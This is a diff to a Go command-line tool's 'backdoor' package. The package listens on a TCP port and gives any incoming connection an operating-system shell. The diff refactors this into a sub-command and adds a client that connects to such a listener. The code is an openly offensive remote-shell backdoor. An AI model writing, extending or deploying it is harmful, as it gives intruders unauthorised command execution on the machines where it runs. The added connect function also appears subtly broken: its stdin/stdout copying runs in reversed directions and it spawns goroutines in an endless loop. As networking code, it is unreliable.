@@ -17,12 +17,29 @@ const tcp = "tcp"
 
 var signals = []os.Signal{syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT}
 
-// Create initializes a new backdoor that allows the incoming connection shell access on the system.
-func Create(port int) {
+// Config collects the command parameters for the backdoor sub-command.
+type Config struct {
+	Create, Connect bool
+	Port            int
+	Address         string
+}
+
+// Run executes the command logic for the backdoor package.
+func Run(cfg *Config) error {
+	var err error
+	switch {
+	case cfg.Create:
+		err = create(cfg.Port)
+	case cfg.Connect:
+		err = connect(cfg.Address)
+	}
+	return err
+}
+
+func create(port int) error {
 	cmd, err := getSysCmd()
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 
 	stop := make(chan os.Signal, 1)
@@ -31,8 +48,7 @@ func Create(port int) {
 
 	lsnr, err := net.Listen(tcp, fmt.Sprintf(":%d", port))
 	if err != nil {
-		log.Println(err)
-		return
+		return err
 	}
 
 	go func() {
@@ -53,7 +69,7 @@ func Create(port int) {
 			for conn := range connChan {
 				conn.Close()
 			}
-			return
+			return nil
 		case conn := <-connChan:
 			go handle(cmd, conn)
 		default:
@@ -83,4 +99,28 @@ func getSysCmd() (*exec.Cmd, error) {
 		err = fmt.Errorf("os %s not supported", runtime.GOOS)
 	}
 	return nil, err
+}
+
+func connect(address string) error {
+	conn, err := net.Dial(tcp, address)
+	if err != nil {
+		return err
+	}
+
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, signals...)
+
+	go func() {
+		defer conn.Close()
+		for {
+			sig := <-c
+			log.Printf("received termination signal : %v\n", sig)
+			return
+		}
+	}()
+
+	for {
+		go io.Copy(conn, os.Stdout)
+		io.Copy(os.Stdin, conn)
+	}
 }
